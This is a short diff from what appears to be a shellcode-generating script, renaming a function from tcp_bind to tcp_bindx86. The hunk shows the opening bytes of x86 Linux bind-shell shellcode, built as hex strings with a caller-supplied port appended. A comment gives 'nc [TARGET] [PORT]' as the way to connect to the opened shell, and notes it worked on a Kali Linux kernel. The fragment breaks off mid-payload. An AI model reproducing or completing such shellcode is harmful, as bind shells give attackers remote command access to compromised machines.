@@ -6,7 +6,7 @@
 #WORKED
 #Linux 4.0.0-kali1-686-pae #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) i686 GNU/Linux
 #Connect : nc [TARGET] [PORT]
-def tcp_bind( PORT):
+def tcp_bindx86( PORT):
 	shellcode =  r"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
 	shellcode += r"\x66\x43\x52\x66\x68"
 	shellcode += PORT
